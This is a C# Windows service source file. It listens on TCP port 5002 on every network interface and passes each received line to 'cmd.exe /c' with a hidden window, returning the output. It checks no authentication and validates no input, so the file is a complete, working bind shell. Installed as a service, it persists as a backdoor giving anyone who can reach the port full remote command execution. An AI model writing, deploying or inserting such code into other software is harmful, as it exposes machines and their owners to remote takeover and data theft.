using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace CmdService
{
    public partial class Service1 : ServiceBase
    {
        private TcpListener server;
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            server = new TcpListener(IPAddress.Any, 5002);
            server.Start();
            server.BeginAcceptTcpClient(HandleClient, null);
        }

        protected override void OnStop()
        {
            server.Stop();
        }

        private void HandleClient(IAsyncResult result)
        {
            TcpClient client = server.EndAcceptTcpClient(result);
            server.BeginAcceptTcpClient(HandleClient, null);

            using (NetworkStream stream = client.GetStream())
            using (StreamReader reader = new StreamReader(stream))
            using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
            {
                string command = reader.ReadLine();
                if (!string.IsNullOrEmpty(command))
                {
                    string output = ExecuteCommand(command);
                    writer.WriteLine(output);
                    writer.WriteLine("END_OF_MESSAGE");
                }
            }

            client.Close();
        }

        private string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(processInfo))
                using (StreamReader reader = process.StandardOutput)
                {
                    return reader.ReadToEnd();
                }
            }
            catch (Exception ex)
            {
                return "Error: " + ex.Message;
            }
        }
    }
}
